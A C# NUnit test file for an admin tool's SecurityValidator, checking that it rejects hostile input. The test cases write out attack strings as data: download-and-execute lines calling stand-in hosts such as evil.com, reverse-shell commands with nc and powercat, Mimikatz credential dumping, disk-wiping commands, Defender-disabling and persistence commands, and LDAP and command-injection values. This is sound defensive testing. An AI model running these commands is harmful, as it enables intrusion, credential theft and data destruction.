using System;
using System.IO;
using NUnit.Framework;
using NecessaryAdminTool.Security;

// TAG: #SECURITY_CRITICAL #AUTOMATED_TESTING #UNIT_TESTS #VERSION_2_0
namespace NecessaryAdminTool.SecurityTests
{
    /// <summary>
    /// Comprehensive unit tests for SecurityValidator
    /// Tests all 12 validation methods against 100+ attack scenarios
    /// TAG: #SECURITY_TESTING #OWASP_TOP_10 #INPUT_VALIDATION
    /// </summary>
    [TestFixture]
    public class SecurityValidatorTests
    {
        #region PowerShell Script Validation Tests

        [TestFixture]
        public class ValidatePowerShellScriptTests
        {
            [Test]
            public void ValidatePowerShellScript_EmptyScript_ReturnsFalse()
            {
                Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(""));
                Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(null));
                Assert.IsFalse(SecurityValidator.ValidatePowerShellScript("   "));
            }

            [Test]
            public void ValidatePowerShellScript_LegitimateScript_ReturnsTrue()
            {
                var script = "Get-Process | Where-Object { $_.CPU -gt 10 }";
                Assert.IsTrue(SecurityValidator.ValidatePowerShellScript(script));
            }

            [Test]
            [TestCase("Invoke-WebRequest http://evil.com")]
            [TestCase("iwr http://malware.com")]
            [TestCase("wget http://attacker.com/payload.exe")]
            [TestCase("curl http://bad.com/script.ps1")]
            public void ValidatePowerShellScript_DownloadPatterns_ReturnsFalse(string script)
            {
                Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(script));
            }

            [Test]
            [TestCase("(New-Object Net.WebClient).DownloadString('http://evil.com')")]
            [TestCase("(New-Object Net.WebClient).DownloadFile('http://evil.com', 'bad.exe')")]
            [TestCase("Start-BitsTransfer -Source http://evil.com")]
            public void ValidatePowerShellScript_WebClientDownload_ReturnsFalse(string script)
            {
                Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(script));
            }

            [Test]
            [TestCase("Invoke-Expression 'Get-Process'")]
            [TestCase("iex (Get-Content malicious.ps1)")]
            [TestCase("IEX (iwr http://evil.com)")]
            public void ValidatePowerShellScript_InvokeExpression_ReturnsFalse(string script)
            {
                Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(script));
            }

            [Test]
            [TestCase("powershell -EncodedCommand SGVsbG8gV29ybGQ=")]
            [TestCase("powershell -enc SGVsbG8gV29ybGQ=")]
            [TestCase("[Convert]::FromBase64String('SGVsbG8gV29ybGQ=')")]
            public void ValidatePowerShellScript_EncodedCommands_ReturnsFalse(string script)
            {
                Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(script));
            }

            [Test]
            [TestCase("Remove-Item -Path C:\\* -Recurse -Force")]
            [TestCase("del /f /s /q C:\\*")]
            [TestCase("rm -rf /")]
            [TestCase("Format-Volume -DriveLetter C -FileSystem NTFS")]
            [TestCase("Clear-Disk -Number 0 -RemoveData")]
            [TestCase("Initialize-Disk -Number 0")]
            public void ValidatePowerShellScript_DestructiveCommands_ReturnsFalse(string script)
            {
                Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(script));
            }

            [Test]
            [TestCase("Invoke-Mimikatz -DumpCreds")]
            [TestCase("mimikatz.exe")]
            [TestCase("Get-Credential -UserName admin")]
            [TestCase("ConvertFrom-SecureString $securePassword")]
            [TestCase("Export-Clixml -Path creds.xml")]
            public void ValidatePowerShellScript_CredentialTheft_ReturnsFalse(string script)
            {
                Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(script));
            }

            [Test]
            [TestCase("New-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'malware.exe')")]
            [TestCase("Register-ScheduledTask -TaskName 'BadTask' -Action $action")]
            [TestCase("Set-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name 'Malware' -Value 'C:\\bad.exe'")]
            [TestCase("Set-ItemProperty -Path HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name 'Malware' -Value 'C:\\bad.exe'")]
            [TestCase("New-Service -Name BadService -BinaryPathName C:\\malware.exe")]
            public void ValidatePowerShellScript_PersistenceMechanisms_ReturnsFalse(string script)
            {
                Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(script));
            }

            [Test]
            [TestCase("Set-MpPreference -DisableRealtimeMonitoring $true")]
            [TestCase("Disable-WindowsDefender")]
            [TestCase("Set-ExecutionPolicy Bypass -Scope Process")]
            [TestCase("Add-MpPreference -ExclusionPath C:\\Malware")]
            public void ValidatePowerShellScript_DisableSecurityFeatures_ReturnsFalse(string script)
            {
                Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(script));
            }

            [Test]
            [TestCase("New-Object System.Net.Sockets.TcpClient('10.0.0.1', 4444)")]
            [TestCase("$client = New-Object System.Net.Sockets.TCPClient")]
            [TestCase("nc.exe -e cmd.exe 10.0.0.1 4444")]
            [TestCase("ncat -lvp 4444 -e cmd.exe")]
            [TestCase("powercat -l -p 4444 -e cmd.exe")]
            public void ValidatePowerShellScript_ReverseShells_ReturnsFalse(string script)
            {
                Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(script));
            }

            [Test]
            [TestCase("$null = Get-Process")]
            [TestCase("Get-Process | Out-Null")]
            [TestCase("powershell -WindowStyle Hidden")]
            public void ValidatePowerShellScript_LoggingBypass_ReturnsFalse(string script)
            {
                Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(script));
            }

            [Test]
            [TestCase("$aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider")]
            [TestCase("[System.Security.Cryptography.Aes]::Create()")]
            [TestCase("$rij = New-Object System.Security.Cryptography.RijndaelManaged")]
            public void ValidatePowerShellScript_EncryptionRansomware_ReturnsFalse(string script)
            {
                Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(script));
            }

            [Test]
            public void ValidatePowerShellScript_HeavyObfuscation_ReturnsFalse()
            {
                var script = "[char[]]$chars = [char]65,[char]66,[char]67; $result = -join $chars; [Convert]::ToString($result)";
                Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(script));
            }

            [Test]
            public void ValidatePowerShellScript_CaseInsensitive_ReturnsFalse()
            {
                Assert.IsFalse(SecurityValidator.ValidatePowerShellScript("INVOKE-WEBREQUEST http://evil.com"));
                Assert.IsFalse(SecurityValidator.ValidatePowerShellScript("InVoKe-ExPrEsSiOn 'malicious'"));
                Assert.IsFalse(SecurityValidator.ValidatePowerShellScript("MiMiKaTz.exe"));
            }
        }

        #endregion

        #region PowerShell Sanitization Tests

        [TestFixture]
        public class SanitizeForPowerShellTests
        {
            [Test]
            public void SanitizeForPowerShell_RemovesBackticks()
            {
                var input = "test`command";
                var result = SecurityValidator.SanitizeForPowerShell(input);
                Assert.IsFalse(result.Contains("`"));
            }

            [Test]
            public void SanitizeForPowerShell_RemovesDollarSigns()
            {
                var input = "test$variable";
                var result = SecurityValidator.SanitizeForPowerShell(input);
                Assert.IsFalse(result.Contains("$"));
            }

            [Test]
            public void SanitizeForPowerShell_RemovesSemicolons()
            {
                var input = "command1; command2";
                var result = SecurityValidator.SanitizeForPowerShell(input);
                Assert.IsFalse(result.Contains(";"));
            }

            [Test]
            public void SanitizeForPowerShell_RemovesAmpersands()
            {
                var input = "command1 & command2";
                var result = SecurityValidator.SanitizeForPowerShell(input);
                Assert.IsFalse(result.Contains("&"));
            }

            [Test]
            public void SanitizeForPowerShell_RemovesPipes()
            {
                var input = "Get-Process | Select-Object";
                var result = SecurityValidator.SanitizeForPowerShell(input);
                Assert.IsFalse(result.Contains("|"));
            }

            [Test]
            public void SanitizeForPowerShell_RemovesRedirection()
            {
                var input = "command > output.txt < input.txt";
                var result = SecurityValidator.SanitizeForPowerShell(input);
                Assert.IsFalse(result.Contains(">"));
                Assert.IsFalse(result.Contains("<"));
            }

            [Test]
            public void SanitizeForPowerShell_RemovesNewlines()
            {
                var input = "line1\nline2\r\nline3";
                var result = SecurityValidator.SanitizeForPowerShell(input);
                Assert.IsFalse(result.Contains("\n"));
                Assert.IsFalse(result.Contains("\r"));
            }

            [Test]
            public void SanitizeForPowerShell_RemovesNullBytes()
            {
                var input = "test\0null";
                var result = SecurityValidator.SanitizeForPowerShell(input);
                Assert.IsFalse(result.Contains("\0"));
            }

            [Test]
            public void SanitizeForPowerShell_EscapesSingleQuotes()
            {
                var input = "O'Reilly";
                var result = SecurityValidator.SanitizeForPowerShell(input);
                Assert.AreEqual("O''Reilly", result);
            }

            [Test]
            public void SanitizeForPowerShell_EmptyInput_ReturnsEmpty()
            {
                Assert.AreEqual("", SecurityValidator.SanitizeForPowerShell(""));
                Assert.AreEqual("", SecurityValidator.SanitizeForPowerShell(null));
            }

            [Test]
            public void SanitizeForPowerShell_AllDangerousChars_RemovedOrEscaped()
            {
                var input = "test`$;command&more|input>output<file'quote\n\r\0";
                var result = SecurityValidator.SanitizeForPowerShell(input);
                Assert.AreEqual("testcommandmoreinputoutputfile''quote", result);
            }
        }

        #endregion

        #region LDAP Filter Validation Tests

        [TestFixture]
        public class ValidateLDAPFilterTests
        {
            [Test]
            public void ValidateLDAPFilter_EmptyFilter_ReturnsFalse()
            {
                Assert.IsFalse(SecurityValidator.ValidateLDAPFilter(""));
                Assert.IsFalse(SecurityValidator.ValidateLDAPFilter(null));
                Assert.IsFalse(SecurityValidator.ValidateLDAPFilter("   "));
            }

            [Test]
            public void ValidateLDAPFilter_ValidFilter_ReturnsTrue()
            {
                Assert.IsTrue(SecurityValidator.ValidateLDAPFilter("(cn=John Doe)"));
                Assert.IsTrue(SecurityValidator.ValidateLDAPFilter("(&(objectClass=user)(cn=John))"));
            }

            [Test]
            public void ValidateLDAPFilter_UnbalancedParentheses_ReturnsFalse()
            {
                Assert.IsFalse(SecurityValidator.ValidateLDAPFilter("(cn=test"));
                Assert.IsFalse(SecurityValidator.ValidateLDAPFilter("cn=test)"));
                Assert.IsFalse(SecurityValidator.ValidateLDAPFilter("((cn=test)"));
            }

            [Test]
            [TestCase("*)(")]
            [TestCase("*)(|")]
            [TestCase("*)(objectClass=*)")]
            [TestCase("*)(&")]
            public void ValidateLDAPFilter_WildcardInjection_ReturnsFalse(string filter)
            {
                Assert.IsFalse(SecurityValidator.ValidateLDAPFilter(filter));
            }

            [Test]
            [TestCase("*)(uid=*)")]
            [TestCase("*)(cn=*)")]
            public void ValidateLDAPFilter_EnumerationAttack_ReturnsFalse(string filter)
            {
                Assert.IsFalse(SecurityValidator.ValidateLDAPFilter(filter));
            }

            [Test]
            public void ValidateLDAPFilter_NullByteInjection_ReturnsFalse()
            {
                Assert.IsFalse(SecurityValidator.ValidateLDAPFilter("(cn=test\0admin)"));
                Assert.IsFalse(SecurityValidator.ValidateLDAPFilter("*))%00"));
            }

            [Test]
            public void ValidateLDAPFilter_AdminEnumeration_ReturnsFalse()
            {
                Assert.IsFalse(SecurityValidator.ValidateLDAPFilter("admin*"));
            }
        }

        #endregion

        #region LDAP Escaping Tests

        [TestFixture]
        public class EscapeLDAPSearchFilterTests
        {
            [Test]
            public void EscapeLDAPSearchFilter_EmptyInput_ReturnsEmpty()
            {
                Assert.AreEqual("", SecurityValidator.EscapeLDAPSearchFilter(""));
                Assert.AreEqual("", SecurityValidator.EscapeLDAPSearchFilter(null));
            }

            [Test]
            public void EscapeLDAPSearchFilter_Asterisk_Escaped()
            {
                var result = SecurityValidator.EscapeLDAPSearchFilter("test*");
                Assert.AreEqual("test\\2a", result);
            }

            [Test]
            public void EscapeLDAPSearchFilter_OpenParenthesis_Escaped()
            {
                var result = SecurityValidator.EscapeLDAPSearchFilter("test(");
                Assert.AreEqual("test\\28", result);
            }

            [Test]
            public void EscapeLDAPSearchFilter_CloseParenthesis_Escaped()
            {
                var result = SecurityValidator.EscapeLDAPSearchFilter("test)");
                Assert.AreEqual("test\\29", result);
            }

            [Test]
            public void EscapeLDAPSearchFilter_Backslash_Escaped()
            {
                var result = SecurityValidator.EscapeLDAPSearchFilter("test\\");
                Assert.AreEqual("test\\5c", result);
            }

            [Test]
            public void EscapeLDAPSearchFilter_NullByte_Escaped()
            {
                var result = SecurityValidator.EscapeLDAPSearchFilter("test\0");
                Assert.AreEqual("test\\00", result);
            }

            [Test]
            public void EscapeLDAPSearchFilter_AllSpecialChars_Escaped()
            {
                var result = SecurityValidator.EscapeLDAPSearchFilter("*()\\");
                Assert.AreEqual("\\2a\\28\\29\\5c", result);
            }

            [Test]
            public void EscapeLDAPSearchFilter_NonASCII_Escaped()
            {
                var result = SecurityValidator.EscapeLDAPSearchFilter("test\x01\x1f");
                Assert.IsTrue(result.Contains("\\01"));
                Assert.IsTrue(result.Contains("\\1f"));
            }
        }

        #endregion

        #region File Path Validation Tests

        [TestFixture]
        public class ValidateFilePathTests
        {
            private string _tempDir;

            [SetUp]
            public void SetUp()
            {
                _tempDir = Path.Combine(Path.GetTempPath(), "SecurityTests_" + Guid.NewGuid().ToString());
                Directory.CreateDirectory(_tempDir);
            }

            [TearDown]
            public void TearDown()
            {
                if (Directory.Exists(_tempDir))
                {
                    Directory.Delete(_tempDir, true);
                }
            }

            [Test]
            public void ValidateFilePath_EmptyPath_ReturnsFalse()
            {
                Assert.IsFalse(SecurityValidator.IsValidFilePath("", _tempDir));
                Assert.IsFalse(SecurityValidator.IsValidFilePath(null, _tempDir));
                Assert.IsFalse(SecurityValidator.IsValidFilePath("   ", _tempDir));
            }

            [Test]
            public void ValidateFilePath_ValidPath_ReturnsTrue()
            {
                var validPath = Path.Combine(_tempDir, "test.txt");
                Assert.IsTrue(SecurityValidator.IsValidFilePath(validPath, _tempDir));
            }

            [Test]
            public void ValidateFilePath_PathTraversalDotDot_ReturnsFalse()
            {
                var maliciousPath = Path.Combine(_tempDir, "..", "..", "Windows", "System32", "config", "sam");
                Assert.IsFalse(SecurityValidator.IsValidFilePath(maliciousPath, _tempDir));
            }

            [Test]
            public void ValidateFilePath_AbsolutePathOutside_ReturnsFalse()
            {
                var outsidePath = @"C:\Windows\System32\config\sam";
                Assert.IsFalse(SecurityValidator.IsValidFilePath(outsidePath, _tempDir));
            }

            [Test]
            public void ValidateFilePath_SubdirectoryWithinBase_ReturnsTrue()
            {
                var subDir = Path.Combine(_tempDir, "subdir", "file.txt");
                Assert.IsTrue(SecurityValidator.IsValidFilePath(subDir, _tempDir));
            }
        }

        #endregion

        #region Filename Validation Tests

        [TestFixture]
        public class ValidateFilenameTests
        {
            [Test]
            public void ValidateFilename_EmptyFilename_ReturnsFalse()
            {
                Assert.IsFalse(SecurityValidator.IsValidFilename(""));
                Assert.IsFalse(SecurityValidator.IsValidFilename(null));
                Assert.IsFalse(SecurityValidator.IsValidFilename("   "));
            }

            [Test]
            public void ValidateFilename_ValidFilename_ReturnsTrue()
            {
                Assert.IsTrue(SecurityValidator.IsValidFilename("test.txt"));
                Assert.IsTrue(SecurityValidator.IsValidFilename("document.pdf"));
                Assert.IsTrue(SecurityValidator.IsValidFilename("script.ps1"));
            }

            [Test]
            public void ValidateFilename_PathTraversalDotDot_ReturnsFalse()
            {
                Assert.IsFalse(SecurityValidator.IsValidFilename("..\\config.txt"));
                Assert.IsFalse(SecurityValidator.IsValidFilename("../config.txt"));
                Assert.IsFalse(SecurityValidator.IsValidFilename("test..txt"));
            }

            [Test]
            public void ValidateFilename_ForwardSlash_ReturnsFalse()
            {
                Assert.IsFalse(SecurityValidator.IsValidFilename("folder/file.txt"));
            }

            [Test]
            public void ValidateFilename_Backslash_ReturnsFalse()
            {
                Assert.IsFalse(SecurityValidator.IsValidFilename("folder\\file.txt"));
            }

            [Test]
            [TestCase("file<.txt")]
            [TestCase("file>.txt")]
            [TestCase("file:.txt")]
            [TestCase("file\".txt")]
            [TestCase("file|.txt")]
            [TestCase("file?.txt")]
            [TestCase("file*.txt")]
            public void ValidateFilename_InvalidChars_ReturnsFalse(string filename)
            {
                Assert.IsFalse(SecurityValidator.IsValidFilename(filename));
            }
        }

        #endregion

        #region Computer Name Validation Tests

        [TestFixture]
        public class ValidateComputerNameTests
        {
            [Test]
            public void ValidateComputerName_EmptyName_ReturnsFalse()
            {
                Assert.IsFalse(SecurityValidator.IsValidComputerName(""));
                Assert.IsFalse(SecurityValidator.IsValidComputerName(null));
                Assert.IsFalse(SecurityValidator.IsValidComputerName("   "));
            }

            [Test]
            public void ValidateComputerName_ValidName_ReturnsTrue()
            {
                Assert.IsTrue(SecurityValidator.IsValidComputerName("DESKTOP-123"));
                Assert.IsTrue(SecurityValidator.IsValidComputerName("SERVER01"));
                Assert.IsTrue(SecurityValidator.IsValidComputerName("WKS-ABC"));
            }

            [Test]
            public void ValidateComputerName_ExceedsNetBIOSLimit_ReturnsFalse()
            {
                var longName = new string('A', 16); // 16 chars, limit is 15
                Assert.IsFalse(SecurityValidator.IsValidComputerName(longName));
            }

            [Test]
            public void ValidateComputerName_ExactlyNetBIOSLimit_ReturnsTrue()
            {
                var exactName = new string('A', 15); // Exactly 15 chars
                Assert.IsTrue(SecurityValidator.IsValidComputerName(exactName));
            }

            [Test]
            [TestCase("SERVER;whoami")]
            [TestCase("PC|malicious")]
            [TestCase("WKS&cmd")]
            [TestCase("DESK$var")]
            [TestCase("PC`exec")]
            public void ValidateComputerName_CommandInjection_ReturnsFalse(string name)
            {
                Assert.IsFalse(SecurityValidator.IsValidComputerName(name));
            }

            [Test]
            public void ValidateComputerName_OnlyAlphanumericHyphen_ReturnsTrue()
            {
                Assert.IsTrue(SecurityValidator.IsValidComputerName("ABC-123-DEF"));
            }

            [Test]
            [TestCase("PC.DOMAIN")]
            [TestCase("SERVER_01")]
            [TestCase("WKS@DOMAIN")]
            public void ValidateComputerName_InvalidChars_ReturnsFalse(string name)
            {
                Assert.IsFalse(SecurityValidator.IsValidComputerName(name));
            }
        }

        #endregion

        #region IP Address Validation Tests

        [TestFixture]
        public class ValidateIPAddressTests
        {
            [Test]
            public void ValidateIPAddress_EmptyAddress_ReturnsFalse()
            {
                Assert.IsFalse(SecurityValidator.IsValidIPAddress(""));
                Assert.IsFalse(SecurityValidator.IsValidIPAddress(null));
                Assert.IsFalse(SecurityValidator.IsValidIPAddress("   "));
            }

            [Test]
            [TestCase("192.168.1.1")]
            [TestCase("10.0.0.1")]
            [TestCase("172.16.0.1")]
            [TestCase("127.0.0.1")]
            public void ValidateIPAddress_ValidIPv4_ReturnsTrue(string ip)
            {
                Assert.IsTrue(SecurityValidator.IsValidIPAddress(ip));
            }

            [Test]
            [TestCase("::1")]
            [TestCase("fe80::1")]
            [TestCase("2001:0db8:85a3:0000:0000:8a2e:0370:7334")]
            public void ValidateIPAddress_ValidIPv6_ReturnsTrue(string ip)
            {
                Assert.IsTrue(SecurityValidator.IsValidIPAddress(ip));
            }

            [Test]
            [TestCase("256.256.256.256")]
            [TestCase("192.168.1")]
            [TestCase("192.168.1.1.1")]
            [TestCase("abc.def.ghi.jkl")]
            public void ValidateIPAddress_InvalidIPv4_ReturnsFalse(string ip)
            {
                Assert.IsFalse(SecurityValidator.IsValidIPAddress(ip));
            }

            [Test]
            [TestCase("192.168.1.1; whoami")]
            [TestCase("10.0.0.1 | nc")]
            [TestCase("172.16.0.1 & malicious")]
            public void ValidateIPAddress_InjectionAttempt_ReturnsFalse(string ip)
            {
                Assert.IsFalse(SecurityValidator.IsValidIPAddress(ip));
            }
        }

        #endregion

        #region Hostname Validation Tests

        [TestFixture]
        public class ValidateHostnameTests
        {
            [Test]
            public void ValidateHostname_EmptyHostname_ReturnsFalse()
            {
                Assert.IsFalse(SecurityValidator.IsValidHostname(""));
                Assert.IsFalse(SecurityValidator.IsValidHostname(null));
                Assert.IsFalse(SecurityValidator.IsValidHostname("   "));
            }

            [Test]
            [TestCase("server.domain.com")]
            [TestCase("web01.example.org")]
            [TestCase("db-primary.local")]
            public void ValidateHostname_ValidDNSName_ReturnsTrue(string hostname)
            {
                Assert.IsTrue(SecurityValidator.IsValidHostname(hostname));
            }

            [Test]
            public void ValidateHostname_ExceedsDNSLimit_ReturnsFalse()
            {
                var longHostname = new string('a', 256); // 256 chars, limit is 255
                Assert.IsFalse(SecurityValidator.IsValidHostname(longHostname));
            }

            [Test]
            [TestCase("server;whoami")]
            [TestCase("web|malicious")]
            [TestCase("db&cmd")]
            [TestCase("host$var")]
            [TestCase("pc`exec")]
            public void ValidateHostname_CommandInjection_ReturnsFalse(string hostname)
            {
                Assert.IsFalse(SecurityValidator.IsValidHostname(hostname));
            }

            [Test]
            [TestCase("host_name")]
            [TestCase("server@domain")]
            [TestCase("web#1")]
            public void ValidateHostname_InvalidDNSChars_ReturnsFalse(string hostname)
            {
                Assert.IsFalse(SecurityValidator.IsValidHostname(hostname));
            }
        }

        #endregion

        #region Username Validation Tests

        [TestFixture]
        public class ValidateUsernameTests
        {
            [Test]
            public void ValidateUsername_EmptyUsername_ReturnsFalse()
            {
                Assert.IsFalse(SecurityValidator.ValidateUsername(""));
                Assert.IsFalse(SecurityValidator.ValidateUsername(null));
                Assert.IsFalse(SecurityValidator.ValidateUsername("   "));
            }

            [Test]
            [TestCase("john.doe")]
            [TestCase("admin")]
            [TestCase("user123")]
            public void ValidateUsername_SimpleUsername_ReturnsTrue(string username)
            {
                Assert.IsTrue(SecurityValidator.ValidateUsername(username));
            }

            [Test]
            [TestCase("DOMAIN\\user")]
            [TestCase("CORP\\administrator")]
            public void ValidateUsername_DomainBackslashFormat_ReturnsTrue(string username)
            {
                Assert.IsTrue(SecurityValidator.ValidateUsername(username));
            }

            [Test]
            [TestCase("user@domain.com")]
            [TestCase("admin@corp.local")]
            public void ValidateUsername_UPNFormat_ReturnsTrue(string username)
            {
                Assert.IsTrue(SecurityValidator.ValidateUsername(username));
            }

            [Test]
            [TestCase("user/admin")]
            [TestCase("admin[0]")]
            [TestCase("user:password")]
            [TestCase("admin<script>")]
            [TestCase("user>file")]
            [TestCase("admin+extra")]
            [TestCase("user=value")]
            [TestCase("admin;command")]
            [TestCase("user,other")]
            [TestCase("admin?query")]
            [TestCase("user*wildcard")]
            [TestCase("admin\"quoted")]
            public void ValidateUsername_InvalidADChars_ReturnsFalse(string username)
            {
                Assert.IsFalse(SecurityValidator.ValidateUsername(username));
            }

            [Test]
            public void ValidateUsername_ExceedsADLimit_ReturnsFalse()
            {
                var longUsername = new string('a', 105); // 105 chars, AD limit is 104
                Assert.IsFalse(SecurityValidator.ValidateUsername(longUsername));
            }

            [Test]
            public void ValidateUsername_ExactlyADLimit_ReturnsTrue()
            {
                var exactUsername = new string('a', 104); // Exactly 104 chars
                Assert.IsTrue(SecurityValidator.ValidateUsername(exactUsername));
            }
        }

        #endregion

        #region Rate Limiting Tests

        [TestFixture]
        public class RateLimitTests
        {
            [Test]
            public void CheckRateLimit_NullUsername_ReturnsFalse()
            {
                Assert.IsFalse(SecurityValidator.CheckRateLimit(null));
                Assert.IsFalse(SecurityValidator.CheckRateLimit(""));
                Assert.IsFalse(SecurityValidator.CheckRateLimit("   "));
            }

            [Test]
            public void CheckRateLimit_FirstAttempt_ReturnsTrue()
            {
                var username = "testuser_" + Guid.NewGuid();
                Assert.IsTrue(SecurityValidator.CheckRateLimit(username));
            }

            [Test]
            public void CheckRateLimit_FiveAttempts_AllAllowed()
            {
                var username = "testuser_" + Guid.NewGuid();
                for (int i = 0; i < 5; i++)
                {
                    Assert.IsTrue(SecurityValidator.CheckRateLimit(username), $"Attempt {i + 1} should be allowed");
                }
            }

            [Test]
            public void CheckRateLimit_SixthAttempt_Blocked()
            {
                var username = "testuser_" + Guid.NewGuid();
                // Use up the 5 allowed attempts
                for (int i = 0; i < 5; i++)
                {
                    SecurityValidator.CheckRateLimit(username);
                }
                // 6th attempt should be blocked
                Assert.IsFalse(SecurityValidator.CheckRateLimit(username));
            }

            [Test]
            public void CheckRateLimit_ExponentialBackoff_IncreasesBlockTime()
            {
                var username = "testuser_" + Guid.NewGuid();
                // Use up the 5 allowed attempts
                for (int i = 0; i < 5; i++)
                {
                    SecurityValidator.CheckRateLimit(username);
                }
                // Multiple subsequent attempts should all be blocked
                for (int i = 0; i < 3; i++)
                {
                    Assert.IsFalse(SecurityValidator.CheckRateLimit(username), $"Block attempt {i + 1} should be blocked");
                }
            }

            [Test]
            public void ResetRateLimit_AllowsNewAttempts()
            {
                var username = "testuser_" + Guid.NewGuid();
                // Use up the 5 allowed attempts
                for (int i = 0; i < 5; i++)
                {
                    SecurityValidator.CheckRateLimit(username);
                }
                // Should be blocked
                Assert.IsFalse(SecurityValidator.CheckRateLimit(username));

                // Reset the rate limit
                SecurityValidator.ResetRateLimit(username);

                // Should now be allowed
                Assert.IsTrue(SecurityValidator.CheckRateLimit(username));
            }

            [Test]
            public void CheckRateLimit_CaseInsensitive()
            {
                var username = "TestUser_" + Guid.NewGuid();
                SecurityValidator.CheckRateLimit(username.ToLower());
                SecurityValidator.CheckRateLimit(username.ToUpper());
                // Both should count toward the same limit
                Assert.IsTrue(SecurityValidator.CheckRateLimit(username));
            }
        }

        #endregion

        #region OU Filter Validation Tests

        [TestFixture]
        public class ValidateOUFilterTests
        {
            [Test]
            public void ValidateOUFilter_EmptyFilter_ReturnsTrue()
            {
                // Empty OU filter is acceptable (means no filter)
                Assert.IsTrue(SecurityValidator.ValidateOUFilter(""));
                Assert.IsTrue(SecurityValidator.ValidateOUFilter(null));
                Assert.IsTrue(SecurityValidator.ValidateOUFilter("   "));
            }

            [Test]
            [TestCase("OU=Users,DC=domain,DC=com")]
            [TestCase("OU=Computers,OU=IT,DC=corp,DC=local")]
            [TestCase("CN=Users,DC=domain,DC=com")]
            public void ValidateOUFilter_ValidDN_ReturnsTrue(string filter)
            {
                Assert.IsTrue(SecurityValidator.ValidateOUFilter(filter));
            }

            [Test]
            [TestCase("OU=Users)(objectClass=*)")]
            [TestCase("OU=Test*)")]
            public void ValidateOUFilter_LDAPInjection_ReturnsFalse(string filter)
            {
                Assert.IsFalse(SecurityValidator.ValidateOUFilter(filter));
            }

            [Test]
            [TestCase("OU=Test;malicious")]
            [TestCase("OU=Users|attacker")]
            [TestCase("OU=Test&command")]
            [TestCase("OU=Users$var")]
            public void ValidateOUFilter_InvalidChars_ReturnsFalse(string filter)
            {
                Assert.IsFalse(SecurityValidator.ValidateOUFilter(filter));
            }
        }

        #endregion
    }
}
